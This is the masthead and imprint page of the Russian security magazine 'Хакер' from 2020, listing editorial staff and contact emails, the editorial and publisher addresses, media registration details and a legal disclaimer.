               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2020